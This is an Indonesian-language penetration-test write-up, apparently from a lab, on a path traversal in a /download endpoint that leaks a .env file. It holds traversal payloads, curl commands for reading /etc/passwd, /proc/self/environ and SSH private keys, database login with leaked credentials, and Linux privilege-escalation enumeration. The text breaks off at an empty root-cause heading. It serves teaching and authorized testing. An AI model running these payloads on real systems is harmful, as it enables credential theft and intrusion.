# Write-Up Path Traversal — Dari Arbitrary File Read hingga Potensi Akses Root

> **Tujuan pembelajaran:** memahami cara memvalidasi path traversal secara sistematis, menentukan batas akses baca proses web, menganalisis file konfigurasi dan source code yang terekspos, lalu memetakan kemungkinan chaining menuju initial access dan privilege escalation.
>
> **Batasan penggunaan:** seluruh pengujian dalam dokumen ini ditujukan untuk laboratorium atau sistem yang telah memberikan izin tertulis. Tahap awal menggunakan pendekatan non-destruktif dan read-only. Eksploitasi lanjutan hanya dilakukan apabila termasuk dalam ruang lingkup pengujian.

---

## 1. Executive Summary

| Komponen | Informasi |
|---|---|
| Target | `192.168.56.120:8080` |
| Endpoint rentan | `/download` |
| Alias endpoint | `/download.php` |
| Parameter | `file` |
| Tanggal validasi | 12 Juli 2026 |
| Mode validasi awal | Deep, non-destruktif, read-only |
| Temuan terkonfirmasi | Path traversal / arbitrary file read |
| File yang berhasil dibaca | `.env` |
| Data terdampak | Kredensial dan konfigurasi database |
| RCE | **Belum terkonfirmasi** |
| Akses root | **Belum terkonfirmasi; merupakan jalur potensial** |
| Severity awal | **High**, dapat menjadi **Critical** apabila berhasil di-chain menjadi RCE atau root |

### Temuan Utama

Parameter `file` menerima input:

```text
../.env
```

dan mengembalikan file `.env` yang berada di luar direktori dokumen yang seharusnya.

Bukti awal:

```text
GET /download?file=../.env
HTTP/1.1 200 OK
Content-Disposition: attachment; filename=".env"
```

Body response diawali oleh:

```text
DB_USERNAME=
DB_PASSWORD=
DB_DATABASE=
```

### Status Pembuktian

| Tahap | Status |
|---|---|
| Endpoint download ditemukan | Terkonfirmasi |
| Baseline file valid dan tidak valid | Terkonfirmasi |
| Path traversal `../.env` | Terkonfirmasi |
| Encoded traversal `..%2F.env` | Terkonfirmasi |
| Pembacaan file sistem lain | Perlu divalidasi |
| Pembacaan source code aplikasi | Perlu divalidasi |
| Penggunaan credential database | Belum dilakukan |
| Akses aplikasi sebagai administrator | Belum dilakukan |
| Remote Command Execution | Belum terkonfirmasi |
| Shell sebagai user sistem | Belum terkonfirmasi |
| Privilege escalation menjadi root | Belum terkonfirmasi |

> Penulisan status ini penting agar laporan membedakan fakta yang telah dibuktikan dengan skenario serangan yang masih bersifat hipotesis.

---

## 2. Attack Chain Potensial

```text
Reconnaissance
      ↓
Menemukan endpoint /download?file=
      ↓
Membuat baseline response
      ↓
Path traversal membaca ../.env
      ↓
Arbitrary file read sebagai user web server
      ↓
┌──────────────────┬──────────────────────┬─────────────────────┐
│ Baca source code │ Baca credential      │ Baca key/backup     │
│ aplikasi         │ database/service     │ atau config sistem  │
└─────────┬────────┴──────────┬───────────┴──────────┬──────────┘
          ↓                   ↓                      ↓
 Menemukan bug lain     Login DB/admin         SSH/service access
          └───────────────────┴──────────────────────┘
                              ↓
                     Initial shell / RCE
                              ↓
                    Local enumeration Linux
                              ↓
       sudo / SUID / cron / capability / service / credential
                              ↓
                      Potensi akses root
```

Path traversal sendiri umumnya memberikan **file read**, bukan langsung command execution. Akses root hanya mungkin apabila file yang dibaca membuka jalur ke credential, private key, source code rentan, atau konfigurasi sistem yang dapat di-chain.

---

## 3. Konsep Dasar untuk Pentester Pemula

### 3.1 Apa Itu Path Traversal?

Path traversal terjadi ketika aplikasi menggunakan input pengguna untuk membentuk path file tanpa validasi yang aman.

Contoh logika rentan:

```php
$file = $_GET['file'];
readfile('/var/www/app/documents/' . $file);
```

Input normal:

```text
uu-1-2024.pdf
```

menghasilkan:

```text
/var/www/app/documents/uu-1-2024.pdf
```

Input berbahaya:

```text
../.env
```

menghasilkan:

```text
/var/www/app/documents/../.env
```

Setelah dinormalisasi oleh filesystem:

```text
/var/www/app/.env
```

Dengan demikian, aplikasi keluar dari direktori `documents`.

---

### 3.2 Apa Arti `../`?

Pada Linux:

```text
.       direktori saat ini
..      direktori induk
../     naik satu tingkat direktori
../../  naik dua tingkat direktori
```

Contoh:

```text
/var/www/app/documents/../../etc/passwd
```

dinormalisasi menjadi:

```text
/var/www/etc/passwd
```

Jumlah `../` yang diperlukan bergantung pada lokasi direktori dasar aplikasi.

---

### 3.3 Path Traversal vs Local File Inclusion

Keduanya sama-sama dapat membaca file lokal, tetapi efeknya berbeda.

| Jenis | Perilaku utama |
|---|---|
| Path traversal / arbitrary file read | File dikirim sebagai data atau download |
| Local File Inclusion | File dimasukkan ke alur eksekusi atau rendering aplikasi |
| Remote File Inclusion | Aplikasi memuat resource dari lokasi remote |
| File upload | Aplikasi menerima dan menyimpan file dari pengguna |

Endpoint ini saat ini terbukti sebagai **arbitrary file read** karena file dikirim sebagai attachment. Belum ada bukti bahwa isi file dieksekusi sebagai kode.

---

### 3.4 Mengapa `.env` Sensitif?

File `.env` sering menyimpan:

```text
DB_HOST
DB_PORT
DB_DATABASE
DB_USERNAME
DB_PASSWORD
APP_KEY
APP_ENV
MAIL_USERNAME
MAIL_PASSWORD
REDIS_PASSWORD
API_TOKEN
```

Kebocoran `.env` dapat memberikan:

- credential database;
- secret aplikasi;
- credential SMTP atau Redis;
- informasi host internal;
- petunjuk framework dan environment;
- credential yang mungkin digunakan ulang.

---

### 3.5 Hak Akses Path Traversal

Aplikasi hanya dapat membaca file yang dapat dibaca oleh user proses web.

Contoh user proses:

```text
www-data
apache
nginx
php-fpm
```

Path traversal tidak otomatis melewati permission Linux.

Sebagai contoh:

```text
/etc/passwd   biasanya dapat dibaca semua user
/etc/shadow   biasanya hanya dapat dibaca root
```

Jika `/etc/shadow` gagal dibaca, hal itu tidak membuktikan bahwa path traversal telah diperbaiki. Kemungkinan proses web hanya tidak memiliki permission.

---

## 4. Phase 1 — Reconnaissance

Tujuan tahap awal adalah memastikan target aktif, mengidentifikasi service, dan memetakan aplikasi sebelum melakukan pengujian parameter.

---

### 4.1 Menentukan Variabel Target

```bash
TARGET="192.168.56.120"
PORT="8080"
BASE_URL="http://${TARGET}:${PORT}"
```

User-Agent yang digunakan:

```bash
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
```

---

### 4.2 Memastikan Target Dapat Dijangkau

```bash
ping -c 4 "$TARGET"
```

> Target yang tidak menjawab ping belum tentu mati. Firewall dapat memblokir ICMP.

Validasi port secara langsung:

```bash
nc -vz "$TARGET" "$PORT"
```

---

### 4.3 Service Enumeration dengan Nmap

Pemindaian awal:

```bash
nmap -Pn -sC -sV -p 8080 \
  "$TARGET" \
  -oA nmap-8080
```

Pemindaian seluruh port apabila termasuk scope:

```bash
nmap -Pn -sC -sV -p- \
  --min-rate 1000 \
  "$TARGET" \
  -oA nmap-allports
```

### Penjelasan Opsi

| Opsi | Fungsi |
|---|---|
| `-Pn` | Menganggap host aktif |
| `-sC` | Menjalankan default NSE scripts |
| `-sV` | Mendeteksi versi service |
| `-p 8080` | Memindai port tertentu |
| `-p-` | Memindai seluruh port TCP |
| `-oA` | Menyimpan hasil dalam beberapa format |

Informasi yang perlu dicatat:

- jenis web server;
- framework atau header aplikasi;
- port SSH;
- port database;
- service internal lain yang terekspos.

---

### 4.4 Mengambil Header Halaman Utama

```bash
curl -sS -D root.headers \
  -o root.body \
  -H "User-Agent: $UA" \
  "$BASE_URL/"
```

Tampilkan header:

```bash
sed -n '1,30p' root.headers
```

Cari petunjuk teknologi:

```bash
grep -Ein \
  'server:|x-powered-by:|set-cookie:|location:|content-type:' \
  root.headers
```

---

### 4.5 Directory Enumeration

Contoh dengan Dirsearch:

```bash
dirsearch \
  -u "$BASE_URL" \
  -e php,html,txt,bak,old,zip,env
```

Endpoint yang perlu dicatat antara lain:

```text
/download
/download.php
/login
/admin
/uploads
/backup
/.git
```

Jangan menganggap status `403` atau redirect sebagai tidak menarik. Status tersebut tetap menunjukkan bahwa resource ada.

---

## 5. Phase 2 — Membuat Baseline

Baseline diperlukan agar respons path traversal dapat dibandingkan dengan perilaku normal aplikasi.

---

### 5.1 Baseline File Valid

```bash
curl --path-as-is -sS \
  -D baseline-valid.headers \
  -o baseline-valid.body \
  -H "User-Agent: $UA" \
  "$BASE_URL/download?file=uu-1-2024.pdf"
```

Periksa:

```bash
head -n 20 baseline-valid.headers
file baseline-valid.body
wc -c baseline-valid.body
sha256sum baseline-valid.body
```

Hasil yang diharapkan:

```text
HTTP/1.1 200 OK
Content-Disposition: attachment; filename="uu-1-2024.pdf"
Content-Type: application/pdf
```

---

### 5.2 Baseline File Tidak Ditemukan

```bash
curl --path-as-is -sS \
  -D baseline-missing.headers \
  -o baseline-missing.body \
  -H "User-Agent: $UA" \
  "$BASE_URL/download?file=missing.pdf"
```

Periksa:

```bash
head -n 20 baseline-missing.headers
cat baseline-missing.body
wc -c baseline-missing.body
```

Hasil yang diharapkan:

```text
HTTP/1.1 404
Berkas tidak ditemukan.
```

---

### 5.3 Mengapa Baseline Penting?

Tanpa baseline, response `200` dapat keliru dianggap berhasil walaupun aplikasi hanya mengembalikan halaman error dengan status yang salah.

Bandingkan:

- status HTTP;
- `Content-Disposition`;
- `Content-Type`;
- panjang body;
- checksum;
- isi beberapa baris awal;
- redirect;
- pesan error.

---

## 6. Phase 3 — Validasi Path Traversal

---

### 6.1 PoC Minimal

Raw request:

```http
GET /download?file=../.env HTTP/1.1
Host: 192.168.56.120:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: */*
Connection: close
```

Validasi dengan `curl`:

```bash
curl --path-as-is -sS \
  -D traversal-env.headers \
  -o traversal-env.body \
  -H "User-Agent: $UA" \
  "$BASE_URL/download?file=../.env"
```

Periksa header:

```bash
head -n 30 traversal-env.headers
```

Periksa isi secara terbatas:

```bash
sed -n '1,10p' traversal-env.body
```

Hasil terkonfirmasi:

```text
HTTP/1.1 200 OK
Content-Disposition: attachment; filename=".env"
```

Body diawali oleh:

```text
DB_USERNAME=
DB_PASSWORD=
DB_DATABASE=
```

---

### 6.2 Alias Endpoint

```bash
curl --path-as-is -sS \
  -D traversal-alias.headers \
  -o traversal-alias.body \
  -H "User-Agent: $UA" \
  "$BASE_URL/download.php?file=../.env"
```

Bandingkan kedua file:

```bash
sha256sum traversal-env.body traversal-alias.body
cmp -s traversal-env.body traversal-alias.body \
  && echo "SAME_CONTENT" \
  || echo "DIFFERENT_CONTENT"
```

Jika checksum sama, `/download` kemungkinan merupakan rewrite atau alias dari `/download.php`.

---

### 6.3 Encoded Traversal

```bash
curl --path-as-is -sS \
  -D traversal-encoded.headers \
  -o traversal-encoded.body \
  -H "User-Agent: $UA" \
  "$BASE_URL/download?file=..%2F.env"
```

Varian lain yang dapat diuji secara terbatas:

```text
../.env
..%2F.env
%2E%2E%2F.env
..%252F.env
```

> Double encoding hanya perlu diuji jika terdapat indikasi bahwa proxy dan aplikasi melakukan decoding bertingkat.

---

### 6.4 Mengapa Menggunakan `--path-as-is`?

`curl` dapat menormalisasi path URL tertentu. Opsi:

```text
--path-as-is
```

meminta `curl` mengirim path sebagaimana ditulis.

Pada kasus ini payload berada pada query parameter, tetapi opsi tersebut tetap membantu menjaga request tetap konsisten ketika menguji variasi path.

---

### 6.5 Menyimpan Bukti Secara Aman

Jangan menampilkan seluruh secret pada laporan.

Buat bukti teredaksi:

```bash
sed -E \
  's/^([A-Za-z0-9_]*(PASS|PASSWORD|SECRET|TOKEN|KEY)[A-Za-z0-9_]*)=.*/\1=[REDACTED]/I' \
  traversal-env.body \
  > traversal-env-redacted.txt
```

Periksa:

```bash
cat traversal-env-redacted.txt
```

Simpan checksum file asli tanpa memasukkan isinya ke laporan:

```bash
sha256sum traversal-env.body \
  > traversal-env.sha256
```

---

## 7. Phase 4 — Menentukan Batas Traversal

Tujuannya adalah mengetahui:

- direktori dasar endpoint;
- berapa tingkat `../` yang diterima;
- apakah absolute path diterima;
- file apa saja yang dapat dibaca oleh proses web.

---

### 7.1 Menguji Kedalaman secara Terkontrol

Gunakan file yang tidak sensitif seperti `/etc/hostname` atau `/etc/os-release`.

```bash
for depth in \
  '../etc/hostname' \
  '../../etc/hostname' \
  '../../../etc/hostname' \
  '../../../../etc/hostname' \
  '../../../../../etc/hostname'
do
  echo "=== $depth ==="

  curl --path-as-is -sS \
    -o /tmp/traversal-test.body \
    -w 'status=%{http_code} size=%{size_download}\n' \
    -H "User-Agent: $UA" \
    "$BASE_URL/download?file=$depth"

  head -n 3 /tmp/traversal-test.body
done
```

> Pada endpoint ini, keberhasilan `../.env` menunjukkan direktori `.env` hanya satu tingkat di atas direktori dokumen. Hal tersebut belum membuktikan bahwa traversal hingga `/etc` dapat dilakukan tanpa kedalaman tambahan.

---

### 7.2 Menguji `/etc/passwd`

`/etc/passwd` umumnya dapat dibaca oleh user biasa dan sering digunakan sebagai proof arbitrary file read.

Contoh setelah kedalaman ditemukan:

```bash
curl --path-as-is -sS \
  -D traversal-passwd.headers \
  -o traversal-passwd.body \
  -H "User-Agent: $UA" \
  "$BASE_URL/download?file=../../../../etc/passwd"
```

Validasi tanpa menampilkan seluruh file:

```bash
grep -E '^(root|www-data|apache|nginx):' \
  traversal-passwd.body
```

Hasil yang mendukung keberhasilan:

```text
root:x:0:0:
www-data:x:
```

> Gunakan jumlah `../` yang benar berdasarkan hasil pengujian. Jangan menyatakan `/etc/passwd` berhasil dibaca sebelum ada output aktual.

---

### 7.3 Menguji Absolute Path

Beberapa implementasi menerima absolute path:

```bash
curl --path-as-is -sS \
  -D absolute-path.headers \
  -o absolute-path.body \
  -H "User-Agent: $UA" \
  "$BASE_URL/download?file=/etc/hostname"
```

Jika aplikasi selalu menambahkan document directory di depan input, absolute path mungkin tidak berfungsi.

---

### 7.4 Membedakan Tidak Ada File dan Tidak Ada Permission

Kemungkinan response:

| Kondisi | Indikator |
|---|---|
| File tidak ada | `404`, pesan file tidak ditemukan |
| Tidak memiliki permission | `403`, warning PHP, body kosong, atau error generik |
| File berhasil dibaca | `200`, nama file sesuai, body valid |
| Filter memblokir traversal | `400`, `403`, atau pesan input tidak valid |

Aplikasi dapat menyembunyikan error, sehingga hasil harus dibandingkan dengan baseline.

---

## 8. Phase 5 — Enumerasi File Read-Only

Tahap ini bertujuan memetakan informasi yang dapat digunakan untuk chaining. Prioritaskan file dengan risiko rendah terlebih dahulu.

---

### 8.1 Daftar File Sistem yang Relatif Aman

```text
/etc/hostname
/etc/os-release
/etc/passwd
/proc/version
/proc/self/status
/proc/self/cmdline
/proc/self/environ
```

Nilai penting:

- hostname;
- distribusi dan versi OS;
- daftar user;
- command line proses web;
- environment process;
- UID/GID proses;
- framework dan runtime.

> `/proc/self/environ` dapat berisi secret. Simpan secara lokal dan redaksi sebelum dimasukkan ke laporan.

---

### 8.2 Konfigurasi Web Server

Apache:

```text
/etc/apache2/apache2.conf
/etc/apache2/ports.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/apache2/sites-available/000-default.conf
```

Nginx:

```text
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/etc/nginx/sites-available/default
```

PHP:

```text
/etc/php/*/apache2/php.ini
/etc/php/*/fpm/php.ini
```

File konfigurasi dapat mengungkap:

- document root;
- virtual host;
- alias;
- lokasi log;
- versi PHP;
- handler file;
- direktori aplikasi.

---

### 8.3 File Aplikasi

Bergantung pada framework:

#### PHP umum

```text
../index.php
../download.php
../config.php
../database.php
../composer.json
../composer.lock
```

#### Laravel

```text
../.env
../artisan
../composer.json
../config/app.php
../config/database.php
../routes/web.php
../app/Http/Controllers/
```

#### Node.js

```text
../package.json
../package-lock.json
../server.js
../app.js
../.env
```

#### Python

```text
../requirements.txt
../app.py
../manage.py
../settings.py
```

Source code yang paling relevan adalah implementasi endpoint download.

---

### 8.4 Backup dan Artefak Deployment

Cari kemungkinan:

```text
../backup.zip
../app.zip
../source.zip
../database.sql
../dump.sql
../.git/config
../.git/HEAD
../.git/index
```

File backup dapat mengungkap:

- source code lengkap;
- credential lama;
- database dump;
- history konfigurasi;
- private key atau token.

---

### 8.5 Helper untuk Mencatat Status dan Ukuran

Gunakan daftar yang terbatas dan disetujui scope:

```bash
paths=(
  "../.env"
  "../../../../etc/hostname"
  "../../../../etc/os-release"
  "../../../../etc/passwd"
  "../../../../proc/self/status"
  "../../../../proc/self/cmdline"
)

for path in "${paths[@]}"; do
  safe_name=$(printf '%s' "$path" | tr '/.' '__')

  curl --path-as-is -sS \
    -o "evidence-${safe_name}.body" \
    -D "evidence-${safe_name}.headers" \
    -w "$path status=%{http_code} size=%{size_download}\n" \
    -H "User-Agent: $UA" \
    "$BASE_URL/download?file=$path"
done
```

Hindari melakukan brute force file sensitif tanpa batas. Gunakan daftar target yang jelas dan relevan.

---

## 9. Phase 6 — Analisis Source Code Endpoint

Apabila source code `download.php` berhasil dibaca, analisis lokal:

```bash
grep -nEi \
  'file_get_contents|readfile|fopen|basename|realpath|download|Content-Disposition|\$_GET' \
  download.php
```

Contoh pola rentan:

```php
$file = $_GET['file'];
$path = __DIR__ . '/documents/' . $file;

if (file_exists($path)) {
    readfile($path);
}
```

Masalah:

- input pengguna menjadi bagian path;
- tidak ada canonicalization;
- tidak ada verifikasi bahwa resolved path tetap berada di direktori dokumen;
- nama file dikembalikan langsung melalui header;
- filter ekstensi, jika ada, belum tentu mencegah traversal.

---

### 9.1 Mencari Bug Tambahan

Saat source tersedia, periksa:

```text
SQL query yang menggabungkan input
system(), exec(), shell_exec(), passthru()
include(), require()
unserialize()
move_uploaded_file()
file_put_contents()
eval()
credential hard-coded
route admin tanpa autentikasi
```

Command pencarian lokal:

```bash
grep -RInE \
  'system\(|exec\(|shell_exec\(|passthru\(|eval\(|unserialize\(|move_uploaded_file\(|file_put_contents\(|include\(|require\(' \
  extracted-source/
```

Temuan source code dapat membuka jalur dari file read ke:

- SQL injection;
- command injection;
- unsafe upload;
- local file inclusion;
- insecure deserialization;
- authentication bypass.

Jangan menyatakan RCE sebelum jalur tersebut diuji dan menghasilkan command execution aktual.

---

## 10. Phase 7 — Analisis `.env` secara Offline

Jangan langsung mengeksekusi isi `.env` menggunakan `source` karena file tersebut berasal dari target dan dapat mengandung karakter atau command tidak aman.

Tampilkan hanya nama variabel:

```bash
grep -E '^[A-Za-z_][A-Za-z0-9_]*=' \
  traversal-env.body \
  | cut -d= -f1
```

Cari variabel relevan:

```bash
grep -E \
  '^(APP_|DB_|DATABASE_|MYSQL_|PG_|REDIS_|MAIL_|SMTP_|AWS_|API_)' \
  traversal-env.body
```

Buat salinan teredaksi:

```bash
awk -F= '
  /^[A-Za-z_][A-Za-z0-9_]*=/ {
      print $1 "=[REDACTED]"
      next
  }
  { print }
' traversal-env.body > traversal-env-redacted.txt
```

Informasi yang perlu dicatat:

| Variabel | Kegunaan |
|---|---|
| `DB_HOST` | Menentukan lokasi database |
| `DB_PORT` | Port database |
| `DB_DATABASE` | Nama database |
| `DB_USERNAME` | User database |
| `DB_PASSWORD` | Password database |
| `APP_KEY` | Secret framework |
| `APP_ENV` | Menunjukkan mode development/production |
| `APP_DEBUG` | Dapat menyebabkan informasi debug bocor |

---

## 11. Phase 8 — Chaining melalui Database

Tahap ini hanya dilakukan apabila penggunaan credential termasuk scope.

---

### 11.1 Memeriksa Port Database

Berdasarkan `.env`, lakukan validasi port:

```bash
nmap -Pn -sV \
  -p 3306,5432,1433,1521,6379 \
  "$TARGET"
```

Jika `DB_HOST` menunjuk host lain:

```bash
nmap -Pn -sV \
  -p <DB_PORT> \
  <DB_HOST>
```

Kemungkinan hasil:

- database hanya bind ke localhost;
- database dapat diakses dari jaringan;
- firewall membatasi koneksi;
- credential valid tetapi user memiliki privilege terbatas.

---

### 11.2 Validasi MariaDB atau MySQL

Gunakan placeholder, bukan menulis secret ke shell history:

```bash
read -rsp 'DB password: ' DB_PASS
echo
```

Login:

```bash
MYSQL_PWD="$DB_PASS" mysql \
  -h <DB_HOST> \
  -P <DB_PORT> \
  -u <DB_USERNAME> \
  <DB_DATABASE>
```

Validasi read-only:

```sql
SELECT VERSION();
SELECT CURRENT_USER();
SELECT DATABASE();
SHOW TABLES;
SHOW GRANTS FOR CURRENT_USER();
```

Catat privilege:

```sql
SHOW GRANTS FOR CURRENT_USER();
```

Fokus awal:

- apakah credential valid;
- database apa yang dapat diakses;
- apakah terdapat tabel akun;
- apakah user DB hanya memiliki `SELECT` atau privilege lebih tinggi.

---

### 11.3 Validasi PostgreSQL

```bash
PGPASSWORD="$DB_PASS" psql \
  -h <DB_HOST> \
  -p <DB_PORT> \
  -U <DB_USERNAME> \
  -d <DB_DATABASE>
```

Query aman:

```sql
SELECT version();
SELECT current_user;
SELECT current_database();
\dt
\du
```

---

### 11.4 Kemungkinan Pivot dari Database

Database dapat membuka jalur ke:

- hash password user aplikasi;
- session aktif;
- token reset password;
- API key;
- konfigurasi internal;
- credential yang digunakan ulang;
- fitur aplikasi yang hanya tersedia untuk admin.

Akses database **tidak otomatis berarti RCE**. Hal tersebut bergantung pada:

- jenis database;
- privilege user;
- konfigurasi server;
- lokasi database;
- fitur yang diaktifkan;
- kemampuan menulis file atau menjalankan extension.

Untuk laporan, dokumentasikan privilege aktual sebelum menyimpulkan dampak.

---

## 12. Phase 9 — Kemungkinan Initial Access

Terdapat beberapa jalur potensial dari arbitrary file read menuju shell.

---

### 12.1 Jalur A — Credential Reuse ke Aplikasi

Apabila database atau file konfigurasi mengungkap akun aplikasi:

1. identifikasi halaman login;
2. gunakan credential hanya jika scope mengizinkan;
3. dokumentasikan apakah akun memiliki role administrator;
4. periksa fitur upload, plugin, template, atau job scheduler;
5. uji fungsi berisiko secara non-destruktif.

Attack path:

```text
Path traversal
→ .env
→ akses database
→ akun administrator aplikasi
→ fitur berprivilege tinggi
→ kemungkinan upload atau command execution
```

---

### 12.2 Jalur B — SSH Private Key Disclosure

Cari secara terbatas apabila terdapat indikasi home directory atau nama user:

```text
/home/<user>/.ssh/id_rsa
/home/<user>/.ssh/id_ed25519
/root/.ssh/id_rsa
```

Kemungkinan besar `/root/.ssh` tidak dapat dibaca oleh proses web.

Jika private key user non-root berhasil diperoleh dan pengujian SSH diizinkan:

```bash
chmod 600 disclosed-key
ssh -i disclosed-key \
  <user>@192.168.56.120
```

Verifikasi host key sebelum melanjutkan.

Keberhasilan SSH memberikan shell sebagai user pemilik key, bukan otomatis root.

---

### 12.3 Jalur C — Credential Service Lain

File konfigurasi dapat mengungkap credential untuk:

```text
FTP/SFTP
Redis
SMTP
message queue
CI/CD
cloud storage
backup service
panel administrator
```

Periksa apakah service tersebut tersedia pada hasil Nmap dan apakah autentikasinya valid.

---

### 12.4 Jalur D — Source Code Mengungkap RCE

Source code dapat menunjukkan:

```text
command injection
unsafe file upload
template injection
deserialization
LFI yang dapat di-chain
debug console
hard-coded administrative route
```

Contoh alur:

```text
Path traversal
→ membaca source endpoint
→ menemukan parameter command injection
→ memvalidasi command `id`
→ RCE sebagai user web
```

Bukti RCE minimal:

```text
uid=<web-user>
gid=<web-group>
```

---

### 12.5 Jalur E — Backup atau Deployment Artifact

Backup dapat berisi:

- private key;
- credential production;
- source code;
- database dump;
- configuration management secret;
- file `.git`.

Apabila `.git` dapat dibaca, repository dapat direkonstruksi untuk analisis source code. Lakukan hanya pada scope yang diizinkan dan jangan mempublikasikan secret.

---

## 13. Phase 10 — Post-Exploitation Setelah Mendapatkan Shell

Bagian ini baru dijalankan setelah terdapat initial access yang sah, misalnya SSH atau RCE.

---

### 13.1 Konfirmasi Konteks User

```bash
id
whoami
groups
hostname
pwd
uname -a
cat /etc/os-release
```

Catat:

```text
UID
GID
supplementary groups
hostname
kernel
distribution
current directory
```

---

### 13.2 Informasi Jaringan dan Service

```bash
ip address
ip route
ss -lntup
ps auxww
```

Tujuannya:

- menemukan service localhost;
- database yang tidak terekspos dari luar;
- service yang berjalan sebagai root;
- interface jaringan tambahan;
- kemungkinan pivot internal.

---

### 13.3 Memeriksa Sudo

```bash
sudo -n -l 2>/dev/null
sudo -l
```

Perhatikan:

```text
NOPASSWD
SETENV
wildcard
binary atau script yang dapat diedit
command yang dapat menjalankan shell
```

Jangan hanya melihat nama command. Periksa juga:

- argument yang diizinkan;
- file konfigurasi yang dipakai;
- environment;
- path binary;
- permission dependency.

---

### 13.4 Memeriksa SUID dan SGID

```bash
find / -perm -4000 -type f -ls 2>/dev/null
find / -perm -2000 -type f -ls 2>/dev/null
```

Temuan tidak biasa:

```text
binary custom di /usr/local/bin
salinan shell
interpreter
editor
utility yang dapat menjalankan command
```

Binary standar SUID tidak otomatis rentan. Bandingkan dengan baseline distribusi dan analisis perilakunya.

---

### 13.5 Memeriksa Linux Capabilities

```bash
getcap -r / 2>/dev/null
```

Capability berisiko antara lain:

```text
cap_setuid
cap_dac_read_search
cap_dac_override
cap_sys_admin
cap_sys_ptrace
```

Contoh:

```text
/usr/bin/python3 cap_setuid+ep
```

dapat menjadi jalur privilege escalation apabila binary dapat mengubah UID proses.

---

### 13.6 Memeriksa Cron dan Systemd Timer

```bash
cat /etc/crontab 2>/dev/null
ls -lah /etc/cron.d /etc/cron.* 2>/dev/null
systemctl list-timers --all 2>/dev/null
```

Untuk setiap command berprivilege tinggi:

```bash
stat -c '%A %a %U %G %n' <SCRIPT>
namei -l <SCRIPT>
```

Cari:

- script root yang writable;
- direktori induk writable;
- relative path;
- wildcard;
- file konfigurasi yang dapat diedit;
- binary yang dapat diganti.

---

### 13.7 Mencari File Writable yang Relevan

Hindari pencarian tanpa filter yang menghasilkan ribuan baris.

```bash
find /etc /opt /usr/local \
  -writable \
  -ls 2>/dev/null
```

Cari script:

```bash
find /etc /opt /usr/local \
  -type f \
  \( -name '*.sh' -o -name '*.py' -o -name '*.pl' \) \
  -writable \
  -ls 2>/dev/null
```

---

### 13.8 Memeriksa Service dan Unit File

```bash
systemctl list-units \
  --type=service \
  --state=running

find /etc/systemd/system \
  -type f \
  -writable \
  -ls 2>/dev/null
```

Periksa service root yang:

- menjalankan binary writable;
- membaca config writable;
- menggunakan relative path;
- memuat environment file writable.

---

### 13.9 Mencari Credential Lokal

Lokasi umum:

```text
/var/www/
/opt/
/home/*/
/etc/
/var/backups/
```

Cari nama file secara terbatas:

```bash
find /var/www /opt /home \
  -type f \
  \( -name '.env' -o -name '*config*' -o -name '*.bak' -o -name '*.old' \) \
  -readable \
  -ls 2>/dev/null
```

Cari string credential tanpa menampilkan terlalu banyak data:

```bash
grep -RIlE \
  'password|passwd|secret|token|api[_-]?key' \
  /var/www /opt 2>/dev/null \
  | head -50
```

---

### 13.10 Memeriksa Kernel sebagai Jalur Terakhir

```bash
uname -a
cat /proc/version
dpkg -l 2>/dev/null | head
```

Eksploitasi kernel sebaiknya menjadi pilihan terakhir karena:

- berisiko menyebabkan crash;
- bergantung pada versi dan patch;
- dapat merusak sistem;
- sering tidak diperlukan jika terdapat misconfiguration.

Gunakan hanya jika scope secara eksplisit mengizinkan dan tidak ada jalur konfigurasi yang lebih aman.

---

## 14. Phase 11 — Pembuktian Akses Root

Akses root hanya dinyatakan berhasil apabila terdapat bukti aktual.

Bukti minimal:

```bash
id
whoami
```

Output yang diharapkan:

```text
uid=0(root) gid=0(root) groups=0(root)
root
```

Atau apabila menggunakan proses dengan effective UID:

```text
uid=<user> gid=<group> euid=0(root)
```

Proof non-destruktif:

```bash
id > /tmp/root_proof
stat -c '%A %a %U %G %n' /tmp/root_proof
cat /tmp/root_proof
```

Hasil:

```text
-rw-r--r-- 644 root root /tmp/root_proof
uid=0(root) gid=0(root) groups=0(root)
```

> Jangan mengubah password, membuat user baru, memasang SSH key, atau membuat persistence kecuali secara eksplisit diizinkan.

---

## 15. Decision Tree Menuju Root

```text
Apakah .env berhasil dibaca?
│
├── Tidak
│   └── Uji encoding, depth, alias endpoint, dan baseline
│
└── Ya
    │
    ├── Apakah source code dapat dibaca?
    │   ├── Ya → cari upload, injection, include, deserialization
    │   └── Tidak
    │
    ├── Apakah DB_HOST/credential tersedia?
    │   ├── Ya → cek port → login read-only → cari akun/token
    │   └── Tidak
    │
    ├── Apakah private key/backup dapat dibaca?
    │   ├── Ya → validasi SSH/service dalam scope
    │   └── Tidak
    │
    └── Apakah initial shell berhasil?
        │
        ├── Tidak → dampak berhenti pada arbitrary file read/secret disclosure
        │
        └── Ya
            ├── sudo -l
            ├── SUID/SGID
            ├── capabilities
            ├── cron/timer
            ├── writable root service/script
            ├── local credential reuse
            └── kernel, sebagai pilihan terakhir
```

---

## 16. Bukti yang Telah Terkonfirmasi

| No. | Bukti | Status |
|---:|---|---|
| 1 | File valid `uu-1-2024.pdf` | Baseline terkonfirmasi |
| 2 | File `missing.pdf` | Baseline error terkonfirmasi |
| 3 | `/download?file=../.env` | `200 OK` |
| 4 | `Content-Disposition` | Nama file `.env` |
| 5 | Body `.env` | Diawali variabel database |
| 6 | `/download.php?file=../.env` | Berhasil |
| 7 | `/download?file=..%2F.env` | Berhasil |
| 8 | Pembacaan `/etc/passwd` | Belum divalidasi |
| 9 | Source code disclosure | Belum divalidasi |
| 10 | Login database | Belum dilakukan |
| 11 | Initial shell / RCE | Belum terkonfirmasi |
| 12 | Root access | Belum terkonfirmasi |

---

## 17. Dampak

### Dampak yang Sudah Terbukti

- pembacaan file di luar direktori dokumen;
- kebocoran `.env`;
- kebocoran username, password, dan nama database;
- terbukanya informasi arsitektur aplikasi.

### Dampak Potensial

- akses tidak sah ke database;
- pengambilalihan akun administrator;
- kebocoran data aplikasi;
- pembacaan source code;
- kebocoran private key atau backup;
- remote command execution;
- akses shell sebagai user aplikasi;
- privilege escalation hingga root.

Severity dapat dinaikkan menjadi **Critical** apabila salah satu jalur berikut terbukti:

```text
credential → admin takeover
credential → database compromise
source code → RCE
private key → SSH access
shell → local privilege escalation → root
```

---

## 18. Root Cause Analysis

